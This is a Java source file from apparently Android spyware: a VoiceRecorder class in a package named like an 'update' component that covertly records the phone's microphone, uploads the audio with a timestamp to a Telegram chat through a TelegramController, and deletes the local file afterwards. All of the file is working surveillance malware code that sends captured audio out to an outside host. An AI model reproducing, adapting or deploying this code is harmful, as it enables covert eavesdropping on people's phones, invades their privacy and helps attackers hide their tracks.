package com.kasari.update;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import java.io.File;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class VoiceRecorder {

    private static MediaRecorder mediaRecorder = null;
    private static String currentFilePath = null;
    private static boolean isRecording = false;
    private static Context contextRef = null;

    public static void startRecording(Context context, int maxDurationSeconds) {
        try {
            if (isRecording) {
                stopRecording(context);
                Thread.sleep(500);
            }
            
            contextRef = context;
            
            File recordingsDir = new File(context.getCacheDir(), "recordings");
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs();
            }
            
            String fileName = "rec_" + System.currentTimeMillis() + ".3gp";
            currentFilePath = new File(recordingsDir, fileName).getAbsolutePath();
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setAudioSamplingRate(8000);
            mediaRecorder.setAudioChannels(1);
            mediaRecorder.setAudioEncodingBitRate(12200);
            mediaRecorder.setOutputFile(currentFilePath);
            mediaRecorder.setMaxDuration(maxDurationSeconds * 1000);
            
            mediaRecorder.setOnInfoListener((mr, what, extra) -> {
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    stopRecording(context);
                }
            });
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            TelegramController.sendMessage(context, 
                "🎤 Recording started... (max " + maxDurationSeconds + "s)");
            
        } catch (Exception e) {
            e.printStackTrace();
            TelegramController.sendMessage(context, "🎤 Recording failed to start");
        }
    }

    public static void stopRecording(Context context) {
        try {
            if (mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                } catch (Exception ignored) {}
                mediaRecorder.release();
                mediaRecorder = null;
            }
            
            if (isRecording && currentFilePath != null) {
                isRecording = false;
                
                File file = new File(currentFilePath);
                if (file.exists() && file.length() > 0) {
                    FileInputStream fis = new FileInputStream(file);
                    byte[] audioBytes = new byte[(int) file.length()];
                    fis.read(audioBytes);
                    fis.close();
                    
                    String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
                        Locale.getDefault()).format(new Date());
                    
                    TelegramController.sendAudio(context, audioBytes, 
                        "🎤 Audio Recording\nTime: " + timestamp);
                    
                    file.delete();
                }
            }
            
            TelegramController.sendMessage(context, "🎤 Recording stopped");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean isRecording() {
        return isRecording;
    }
}